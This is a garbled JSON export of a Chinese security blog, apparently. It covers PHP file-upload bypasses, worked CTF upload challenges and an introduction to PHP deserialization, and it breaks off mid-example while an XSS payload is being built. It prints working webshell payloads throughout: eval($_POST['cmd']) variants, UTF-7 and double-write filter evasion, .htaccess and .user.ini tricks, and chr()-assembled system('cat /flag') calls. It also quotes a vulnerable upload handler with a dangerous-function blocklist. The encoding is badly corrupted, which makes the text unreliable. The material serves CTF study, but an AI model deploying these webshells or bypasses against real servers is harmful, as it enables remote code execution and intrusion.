å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚ è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æŽ¥å’Œæœ‰æ•ˆçš„ï¼Œâ€œæ–‡ä»¶ä¸Šä¼ â€æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åŽï¼ŒæœåŠ¡å™¨æ€Žä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æžœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘åšçš„ä¸å¤Ÿå®‰å…¨ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¥é‡çš„åŽæžœã€‚","text":"ä¸€äº›webåº”ç”¨ç¨‹åºä¸­å…è®¸ä¸Šä¼ å›¾ç‰‡ï¼Œæ–‡æœ¬æˆ–è€…å…¶ä»–èµ„æºåˆ°æŒ‡å®šçš„ä½ç½®ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´žå°±æ˜¯åˆ©ç”¨è¿™äº›å¯ä»¥ä¸Šä¼ çš„åœ°æ–¹å°†æ¶æ„ä»£ç æ¤å…¥åˆ°æœåŠ¡å™¨ä¸­ï¼Œå†é€šè¿‡urlåŽ»è®¿é—®ä»¥æ‰§è¡Œä»£ç ã€‚ é€šå¸¸é€ æˆæ–‡ä»¶ä¸Šä¼ æ¼æ´žçš„åŽŸå› æ˜¯ï¼šå¯¹äºŽä¸Šä¼ æ–‡ä»¶çš„åŽç¼€åï¼ˆæ‰©å±•åï¼‰ï¼Œç±»åž‹ï¼Œä»¥åŠå†…å®¹æ²¡æœ‰åšå¥½ä¸¥æ ¼çš„é™åˆ¶ç­‰ç­‰ä¸€äº›åŽŸå› ã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´žæ˜¯æŒ‡ç”±äºŽç¨‹åºå‘˜æœªå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™å‘æœåŠ¡å™¨ä¸Šä¸Šä¼ å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚ è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æŽ¥å’Œæœ‰æ•ˆçš„ï¼Œâ€œæ–‡ä»¶ä¸Šä¼ â€æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åŽï¼ŒæœåŠ¡å™¨æ€Žä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æžœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘åšçš„ä¸å¤Ÿå®‰å…¨ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¥é‡çš„åŽæžœã€‚ æ–‡ä»¶ä¸Šä¼ æ¼æ´ž.htaccessä»»æ„æ–‡ä»¶è§£æž .htaccesså¯ä»¥å¸®æˆ‘ä»¬å®žçŽ°ï¼šç½‘é¡µ301é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é”™è¯¯é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€å°ç¦ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ï¼Œåªå…è®¸ç‰¹å®šIPåœ°å€çš„ç”¨æˆ·ï¼Œä»¥åŠä½¿ç”¨å…¶ä»–æ–‡ä»¶ä½œä¸ºindexæ–‡ä»¶é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚ å½“æœåŠ¡å™¨æ˜¯ä¸Šä¼ ä½¿ç”¨çš„æ˜¯é»‘åå•æœºåˆ¶ï¼Œä½†æ˜¯é”æ­»äº†ä¸ç»™ä¸Šä¼ phpåŽç¼€çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨.htaccessæ–‡ä»¶é‡æ–°é…ç½®å½“å‰æ–‡ä»¶çš„è§£æžåŽç¼€ä¸ºå…¶ä»–åŽç¼€ç»•è¿‡å¯¼è‡´å…¶ä»–åŽç¼€çš„æ–‡ä»¶è¢«è§£æžä¸ºphpã€‚å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ 1AddType application&#x2F;x-httpd-php .aaa .htaccessæ–‡ä»¶é…ç½®ä¿¡æ¯,è¿™é‡Œå°†åŽç¼€ä¸º.aaaçš„æ–‡ä»¶å‡è§£æžä¸ºphpæ–‡ä»¶ çŸ­æ ‡ç­¾ç»•è¿‡å‡è®¾&lt;?php è¢«è¢«è¿‡æ»¤ï¼ŒåŒæ—¶PHPç‰ˆæœ¬ä¸º5å¯ä»¥ä½¿ç”¨æ®µæ ‡ç­¾ç»•è¿‡ã€‚ JSé£Žæ ¼ 1&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt; çŸ­æ ‡ç­¾é£Žæ ¼ 1&lt;?=phpinfo();?&gt; &lt;?=?&gt;ä¸Ž&lt;?php echo ....?&gt;ç­‰æ•ˆ ASPé£Žæ ¼ 1&lt;% phpinfo();%&gt; å®˜æ–¹é»˜è®¤é£Žæ ¼ 1&lt;?php phpinfo(); ?&gt; ç‰¹æ®Šç¼–ç ç»•è¿‡(UTF-7)å¦‚æžœç¨‹åºè¿‡æ»¤äº†æ‰€æœ‰æ ‡ç­¾å½¢å¼ã€æˆ–è€…è¯´è¿‡æ»¤äº†&lt;?è€Œä¸”PHPæ˜¯åœ¨PHP7ä»¥ä¸Šç‰ˆæœ¬ï¼ˆPHP7å·²ç»å°†å…¶ä»–æ ‡ç­¾å½¢å¼è¿‡æ·˜æ±°ï¼Œä»…å‰©ä¸‹&lt;?phpå½¢å¼ï¼‰ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨.htaccessè§£ç å¯¹åº”çš„æ–‡ä»¶ï¼Œä¾‹å¦‚å¯ä»¥ä½¿ç”¨UTF-7è¿›è¡Œè§£ç ï¼š(https://www.novel.tools/encode/UTF-7è¿™ä¸ªç½‘ç«™å¯ä»¥ç¼–ç å’Œè§£ç UTF-7ï¼‰ .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- åŒå†™ç»•è¿‡å‡å¦‚å¯¹ä¸Šä¼ æ–‡ä»¶çš„å†…å®¹ä¸­çš„phpï¼ŒPOSTï¼Œevalæ›¿æ¢ä¸ºç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨è¿™æ ·çš„æ–¹å¼ç»•è¿‡ã€‚ 12&lt;?pphphp@eevalval($_PPOSTOST[&#x27;cmd&#x27;]); 123&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.iniç»•è¿‡å‡å¦‚.htaccessè¢«è¿‡æ»¤äº†ï¼Œä¸å…è®¸ä¸Šä¼ ï¼Œè€Œä¸Šä¼ ç›®å½•ä¸‹æœ‰ä¸€ä¸ªphpæ–‡ä»¶ï¼Œåˆ™å¯ä»¥ä½¿ç”¨.user.iniå°†æˆ‘ä»¬åˆ¶å®šæ–‡ä»¶åŒ…å«åˆ°æˆ‘ä»¬ç›®å½•ä¸‹çš„æ‰€æœ‰PHPæ–‡ä»¶å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ 1.aaa 12&lt;?php@eval($_POST[&#x27;cmd&#x27;]); .user.ini 1auto_prepend_file&#x3D;1.aaa åŠ è½½å…¶å®ƒphpæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå…ˆåŠ è½½.user.inié‡Œçš„1.aaa .htaccessæ–‡ä»¶æ¢è¡Œç»•è¿‡ä¸Šä¼ .htaccessæ–‡ä»¶æ—¶å€™å‘çŽ°æ–‡ä»¶å†…å®¹è¢«è¿‡æ»¤ã€‚å¯ä»¥ä½¿ç”¨æ¢è¡Œç»•è¿‡çš„æ–¹æ³•ç»•è¿‡è¿‡æ»¤ã€‚ .htaccessæ”¯æŒæ¢è¡Œç¼–å†™æ‰€ä»¥ä½¿ç”¨æ¢è¡Œå¯ä»¥ç›´æŽ¥ä¸Šä¼ æˆåŠŸå¹¶è§£æžã€‚ 12AddType appli\\cation&#x2F;x-httpd-php .aaa è¿‡æ»¤æŽ‰applicationï¼Œåˆ™ä½¿ç”¨æ¢è¡Œç»•è¿‡ æ–‡ä»¶åŒ…å«è§£ç Base64 .htaccess 12AddType application&#x2F;x-httpd-php .aaaphp_value auto_append_file &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;shell.aaa&quot; åŠ¨æ€æ‹¼æŽ¥å‡½æ•°ç»•è¿‡å‡½æ•°è¿‡æ»¤å¯¹å±é™©å‡½æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œä¸å…è®¸ä¸Šä¼ ï¼Œåˆ™å¯ä»¥ä½¿ç”¨aiiscç æ‹¼æŽ¥åŠ¨æ€æž„é€ å‡½æ•°æ¥ç»•è¿‡ã€‚ ä½¿ç”¨è„šæœ¬å¿«é€Ÿç”ŸæˆæŒ‡å®šå‡½æ•° 123456&lt;?php$a = &quot;phpinfo&quot;;for($i=0;$i&lt;strlen($a);$i++)&#123; echo &quot;chr(&quot;.ord($a[$i]).&quot;).&quot;;&#125;?&gt; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111) 1.aaa 1234&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; å›¾ç‰‡å¤´ç»•è¿‡ä¸Šä¼ 1.aaaï¼Œè¢«æ£€æµ‹åˆ°æ–‡ä»¶ä¸æ˜¯å›¾ç‰‡ç±»åž‹ï¼Œåˆ™å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹æ³•ç»•è¿‡ï¼Œåˆ™æœ‰å¯èƒ½è¢«è¯†åˆ«ä¸ºå›¾ç‰‡ï¼Œç»•è¿‡æ£€æµ‹ã€‚ XMBæ–‡ä»¶å¤´ç»•è¿‡12#define test_width 16#define test_height 7 1.aaa 123456#define test_width 16#define test_height 7&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; GIF89a1GIF89a 1.aaa 12345GIF89a&lt;?php$a &#x3D; chr(112).chr(104).chr(112).chr(105).chr(110).chr(102).chr(111);$a();?&gt; é¢˜ç›®upload2å‘çŽ°ä¸èƒ½ä¸Šä¼ phpæ–‡ä»¶ï¼Œä¸”æ–‡ä»¶å†…å®¹ä¸èƒ½ä½¿ç”¨å®˜æ–¹é»˜è®¤é£Žæ ¼(ä¸Šä¼ æç¤ºï¼šCanâ€™t upload php file)ï¼Œæ‰€ä»¥å°è¯•ä½¿ç”¨å…¶å®ƒæ ‡ç­¾ç»•è¿‡ .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 1&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&#39;cmd&#39;]);&lt;&#x2F;script&gt; åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagã€‚ æˆ–è€… cat /flag upload3 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); å‘çŽ°phpï¼Œevalï¼ŒPOSTè¢«æ›¿æ¢ä¸ºç©ºï¼Œä½¿ç”¨åŒå†™ç»•è¿‡ã€‚ .htaccess 1AddType application&#x2F;x-httpd-pphphp .aaa 1.aaa 12&lt;?pphphp@eevalval($_PPOSTOST[&#39;cmd&#39;]); upload4 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); å‘çŽ°æ²¡æœ‰ä¸Šä¼ ã€‚ä¸Šä¼ test.phpå’Œ1.jpgï¼ˆä¸æ˜¯çœŸçš„jpgæ–‡ä»¶ï¼‰ä¹Ÿéƒ½å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨.user.iniç»•è¿‡ï¼Œç»“æžœæç¤ºï¼šå†…å®¹ä¸èƒ½æœ‰fileã€‚ å‡ æ¬¡å°è¯•åŽå‘çŽ°ï¼Œå®ƒå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ£€æŸ¥ï¼Œä¸èƒ½å«æœ‰&lt;?ï¼Œä¸”æ— æ³•ç”¨å…¶å®ƒæ ‡ç­¾ç»•è¿‡ã€‚ å°è¯•ä½¿ç”¨ç‰¹æ®Šç¼–ç ç»•è¿‡ï¼Œä¸Šä¼ .htaccesså’Œ1.aaa .htaccess 1234AddType application&#x2F;x-httpd-php .aaaphp_flag display_errors onphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; 1.aaa 1+ADw?php +AEA-eval(+ACQAXw-POST+AFs&#39;cmd&#39;+AF0)+ADs?+AD4- åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagã€‚ æ‰¾åˆ°flagä¹‹åŽæŸ¥çœ‹phpç‰ˆæœ¬ä¸ºï¼š7.0.33 å°è¯•å‘çŽ°ï¼š ç”±äºŽç‰ˆæœ¬ä¸º7.0ä»¥ä¸Šä¸”è¿‡æ»¤æŽ‰&lt;?ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨å…¶å®ƒæ ‡ç­¾ç»•è¿‡ã€‚ upload6 .htaccess 1AddType application&#x2F;x-httpd-php .aaa æç¤ºï¼šå†…å®¹ä¸èƒ½æœ‰application å°è¯•ä½¿ç”¨.htaccessæ–‡ä»¶æ¢è¡Œç»•è¿‡ã€‚ .htaccess 12AddType appli\\cation&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); upload7 .htaccess 1AddType application&#x2F;x-httpd-php .aaa 1.aaa 12&lt;?php@eval($_POST[&#39;cmd&#39;]); ä¸Šä¼ 1.aaa æç¤ºï¼šä¸èƒ½å«æœ‰å±é™©å‡½æ•°ï¼ ä½¿ç”¨burp suiteæŠ“åŒ…çœ‹çœ‹ï¼Œå‘çŽ°evalå’ŒPOSTè¢«è¿‡æ»¤äº†ã€‚ å°è¯•ä½¿ç”¨åŠ¨æ€æ‹¼æŽ¥å‡½æ•°ç»•è¿‡å‡½æ•°è¿‡æ»¤ï¼Œå‘çŽ°å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œç„¶åŽè®¿é—®è¯¥æ–‡ä»¶å°±å¯ä»¥å¾—åˆ°flagã€‚ 1.aaa 123&lt;?php$a &#x3D; chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$a(&#39;cat &#x2F;flag&#39;); 123&lt;?php$a = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);echo $a; è¾“å‡ºï¼šsystem PSï¼š ctf-wscanä¸‹è½½åœ°å€ï¼šhttps://codeload.github.com/kingkaki/ctf-wscan/zip/master åšé¢˜å‰å¯ä»¥å…ˆæ‰«æ‰«çœ‹æœ‰æ²¡æœ‰å¤‡ä»½æ–‡ä»¶ åƒrobots.txt ã€www.zipã€‚ ä½¿ç”¨æ‰«æå™¨æ‰«æå‘çŽ°å­˜åœ¨å¤‡ä»½æ–‡ä»¶ ä¸‹è½½å¤‡ä»½æ–‡ä»¶ æŠŠ.index.php.swpæ”¾åˆ°linuxä¸‹ä½¿ç”¨vim -ræ¢å¤ 1vim -r index.php.swp å¾—åˆ°æºä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php//è®¾ç½®ä¸Šä¼ ç›®å½•define(&quot;UPLOAD_PATH&quot;, &quot;../upload&quot;);function deldot($s)&#123; for($i=strlen($s)-1;$i&gt;0;$i--)&#123; $c=substr($s,$i,1); if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123; return $s; &#125; if($c != &#x27;.&#x27;)&#123; return substr($s,0,$i+1); &#125; &#125;&#125;$is_upload=false;$msg=null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext=array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name=trim($_FILES[&#x27;pic&#x27;][&#x27;name&#x27;]); $file_name=deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext=strrchr($file_name, &#x27;.&#x27;); $file_ext=strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext=str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//åŽ»é™¤å­—ç¬¦ä¸²::$DATA $file_ext=trim($file_ext); //æ”¶å°¾åŽ»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file=$_FILES[&#x27;pic&#x27;][&#x27;tmp_name&#x27;]; $img_path=UPLOAD_PATH.&#x27;/&#x27;.$file_name; if(preg_match(&quot;/(phpinfo|system\\(|eval\\(|file_put_contents|file_get_contents|passthru|exec\\(|chroot|scandir|proc_open|delfolder|unlink|mkdir|fopen|fread|fwrite|fputs|tmpfile|flock|chmod|delete|assert|_post|_get|_request|_file|create_function|array_walk|preg_replace|cookie)/Ui&quot;,file_get_contents($temp_file)))&#123; die(&quot;ä¸èƒ½å«æœ‰å±é™©å‡½æ•°ï¼&quot;); &#125; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload=true; echo &quot;ä¸Šä¼ æˆåŠŸ&quot;.&quot;&lt;br&gt;&quot;; echo $img_path; &#125;else&#123; echo &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125;else&#123; echo &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;; &#125; &#125;else&#123; echo UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·é‡æ–°ä¸Šä¼ ï¼&#x27;; mkdir(UPLOAD_PATH,775,true); &#125;&#125;?&gt;","categories":[{"name":"ä¿¡æ¯å®‰å…¨","slug":"ä¿¡æ¯å®‰å…¨","permalink":"https://flag2020.top/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"web","slug":"web","permalink":"https://flag2020.top/tags/web/"}]},{"title":"ååºåˆ—åŒ–æ¼æ´ž","slug":"ååºåˆ—åŒ–æ¼æ´ž","date":"2020-10-07T16:00:00.000Z","updated":"2020-11-11T15:23:22.458Z","comments":true,"path":"2020/10/08/ååºåˆ—åŒ–æ¼æ´ž/","link":"","permalink":"https://flag2020.top/2020/10/08/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","excerpt":"æ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›žä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›žphpåŽŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚ åºåˆ—åŒ– serialize() å°†å¯¹è±¡è½¬å˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ä¾¿äºŽä¹‹åŽçš„ä¼ é€’ä¸Žä½¿ç”¨ã€‚ åºåˆ—åŒ–ä¼šä¿å­˜å¯¹è±¡æ‰€æœ‰çš„å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ã€‚ ååºåˆ—åŒ– unserialize() å°†åºåˆ—åŒ–çš„ç»“æžœæ¢å¤æˆå¯¹è±¡ã€‚ ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»åœ¨ååºåˆ—åŒ–ä¹‹å‰å®šä¹‰ï¼Œæˆ–è€…é€šè¿‡åŒ…å«è¯¥ç±»çš„å®šä¹‰æˆ–è€…ä½¿ç”¨ spl_autoload_register() (è‡ªåŠ¨åŒ…å«ç±»)å®žçŽ°","text":"æ‰€æœ‰phpé‡Œé¢çš„å€¼éƒ½å¯ä»¥ä½¿ç”¨å‡½æ•°serialize()æ¥è¿”å›žä¸€ä¸ªåŒ…å«å­—èŠ‚æµçš„å­—ç¬¦ä¸²æ¥è¡¨ç¤ºã€‚unserialize()å‡½æ•°èƒ½å¤Ÿé‡æ–°æŠŠå­—ç¬¦ä¸²å˜å›žphpåŽŸæ¥çš„å€¼ã€‚ åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å°†ä¼šä¿å­˜å¯¹è±¡çš„æ‰€æœ‰å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¼šä¿å­˜ç±»çš„åå­—ã€‚ åºåˆ—åŒ– serialize() å°†å¯¹è±¡è½¬å˜æˆä¸€ä¸ªå­—ç¬¦ä¸²ä¾¿äºŽä¹‹åŽçš„ä¼ é€’ä¸Žä½¿ç”¨ã€‚ åºåˆ—åŒ–ä¼šä¿å­˜å¯¹è±¡æ‰€æœ‰çš„å˜é‡ï¼Œä½†æ˜¯ä¸ä¼šä¿å­˜å¯¹è±¡çš„æ–¹æ³•ã€‚ ååºåˆ—åŒ– unserialize() å°†åºåˆ—åŒ–çš„ç»“æžœæ¢å¤æˆå¯¹è±¡ã€‚ ååºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡çš„ç±»å¿…é¡»åœ¨ååºåˆ—åŒ–ä¹‹å‰å®šä¹‰ï¼Œæˆ–è€…é€šè¿‡åŒ…å«è¯¥ç±»çš„å®šä¹‰æˆ–è€…ä½¿ç”¨ spl_autoload_register() (è‡ªåŠ¨åŒ…å«ç±»)å®žçŽ° ååºåˆ—åŒ–æ¼æ´žåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æžœååºåˆ—åŒ–çš„å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æŽ§åˆ¶çš„ï¼Œä¸”åŽå°ä¸æ­£å½“çš„ä½¿ç”¨äº†PHPä¸­çš„é­”æ³•å‡½æ•°ï¼Œå°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ phpé­”æœ¯æ–¹æ³• PHP å°†æ‰€æœ‰ä»¥ __ï¼ˆä¸¤ä¸ªä¸‹åˆ’çº¿ï¼‰å¼€å¤´çš„ç±»æ–¹æ³•ä¿ç•™ä¸ºé­”æœ¯æ–¹æ³•ã€‚ é€šå¸¸æ¥è¯´æœ‰ä¸€äº›PHPçš„é­”æ³•å‡½æ•°ä¼šå¯¼è‡´ååºåˆ—åŒ–æ¼æ´žï¼Œå¦‚ï¼š __construct å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è‡ªåŠ¨è°ƒç”¨ __wakeup ä½¿ç”¨unserialize()å‡½æ•°æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨ __destruct å½“å¯¹è±¡è¢«é”€æ¯æ—¶è‡ªåŠ¨è°ƒç”¨ (phpç»å¤§å¤šæ•°æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡) __toString å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¢«è°ƒç”¨ã€‚ __sleep() ä½¿ç”¨serialize()å‡½æ•°æ—¶è§¦å‘ __call() åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __callStatic() åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘ __get() ç”¨äºŽä»Žä¸å¯è®¿é—®çš„å±žæ€§è¯»å–æ•°æ® __set() ç”¨äºŽå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±žæ€§ __isset() åœ¨ä¸å¯è®¿é—®çš„å±žæ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘ __unset() åœ¨ä¸å¯è®¿é—®çš„å±žæ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ __toString() æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›žå€¼éœ€è¦ä¸ºå­—ç¬¦ä¸² __invoke() å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ 12345678910111213141516171819202122232425262728293031&lt;?phpclass test &#123; public $varr1 = &quot;abc&quot;; public $varr2 = &quot;123&quot;; public function echoP() &#123; echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; &#125; public function __construct() &#123; echo &quot;__construct&lt;br&gt;&quot;; &#125; public function __destruct() &#123; echo &quot;__destruct&lt;br&gt;&quot;; &#125; public function __toString() &#123; return &quot;__toString&lt;br&gt;&quot;; &#125; public function __sleep() &#123; echo &quot;__sleep&lt;br&gt;&quot;; return array(&#x27;varr1&#x27;,&#x27;varr2&#x27;); &#125; public function __wakeup() &#123; echo&quot;__wakeup&lt;br&gt;&quot;; &#125;&#125;$obj = new test();//åºåˆ—åŒ–å¯¹è±¡ï¼Œè°ƒç”¨__construct()æ–¹æ³•ï¼Œè¾“å‡º__construct$obj-&gt;echoP(); //è°ƒç”¨echoP()æ–¹æ³•ï¼Œè¾“å‡º&quot;abc&quot;echo $obj; //objå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²è¾“å‡ºï¼Œè°ƒç”¨__toString()æ–¹æ³•ï¼Œè¾“å‡º__toString$s = serialize($obj); //objå¯¹è±¡è¢«åºåˆ—åŒ–ï¼Œè°ƒç”¨__sleep()æ–¹æ³•ï¼Œè¾“å‡º__sleepecho unserialize($s); //$sé¦–å…ˆä¼šè¢«ååºåˆ—åŒ–ï¼Œä¼šè°ƒç”¨__wakeup()æ–¹æ³•ï¼Œè¢«ååºåˆ—åŒ–å‡ºæ¥çš„å¯¹è±¡åˆè¢«å½“åšå­—ç¬¦ä¸²ï¼Œå°±ä¼šè°ƒç”¨_toString()æ–¹æ³•ã€‚ //è„šæœ¬ç»“æŸé”€æ¯å¯¹è±¡ï¼ˆ$objå’Œååºåˆ—åŒ–çš„$sï¼‰æ—¶ï¼Œåˆä¼šè°ƒç”¨__destruct()æ–¹æ³•ï¼ˆä¸¤æ¬¡ï¼‰ï¼Œè¾“å‡º__destructï¼ˆä¸¤æ¬¡ï¼‰?&gt; ååºåˆ—åŒ–æ¼æ´žä¾‹å­ï¼š 12345678910&lt;?phpclass A&#123; var $test = &quot;kawhi&quot;; function __wakeup()&#123; echo $this-&gt;test; &#125;&#125;$a = $_GET[&#x27;a&#x27;];$b = unserialize($a);?&gt; å°è¯•æž„é€ åºåˆ—åŒ–ä»£ç çš„æ—¶å€™æ’å…¥xss 1234567891011&lt;?phpclass A&#123; var $test = &quot;&lt;img src=1 